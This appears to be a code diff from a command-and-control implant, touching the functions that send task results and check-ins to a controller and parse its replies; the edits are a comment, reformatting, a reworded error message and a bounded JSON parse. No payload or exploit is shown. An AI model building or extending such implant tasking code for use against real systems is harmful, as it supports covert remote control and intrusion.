@@ -9,6 +9,7 @@ BOOL ImplantSendTasks( DWORD Count ) {
     json       TaskResultArray  = json::array();
     PTASK_INFO TaskInfo         = NULL;
 
+    // create json array of tasks
     for (int i = 0; !IsListEmpty( &g_Implant.TaskResponseList ) && i < Count; i++) {
         PLIST_ENTRY Node     = RemoveHeadList( &g_Implant.TaskResponseList );
         TASK_INFO*  TaskInfo = CONTAINING_RECORD( Node, TASK_INFO, ListEntry );
@@ -22,9 +23,8 @@ BOOL ImplantSendTasks( DWORD Count ) {
     packet["tasks"] = TaskResultArray;
 
     auto serialized = packet.dump();
-    if (!g_Channel->Interface->Send(
-            g_Channel->Interface->Context, serialized.c_str(), serialized.size(), FALSE )) {
-        puts( "failed to send request" );
+    if (!g_Channel->Interface->Send( g_Channel->Interface->Context, serialized.c_str(), serialized.size(), FALSE )) {
+        puts( "[-] Failed to send request" );
         return FALSE;
     }
 
@@ -56,8 +56,7 @@ BOOL ImplantSendCheckin( json& task, json& response ) {
 
     auto serialized = packet.dump();
 
-    if (!g_Channel->Interface->Send(
-            g_Channel->Interface->Context, serialized.c_str(), serialized.size(), TRUE )) {
+    if (!g_Channel->Interface->Send( g_Channel->Interface->Context, serialized.c_str(), serialized.size(), TRUE )) {
         return FALSE;
     }
 
@@ -70,7 +69,7 @@ BOOL ImplantSendCheckin( json& task, json& response ) {
         return FALSE;
     }
 
-    response = json::parse( buffer );
+    response = json::parse( buffer, (CHAR*)buffer + size );
 
     return TRUE;
 }
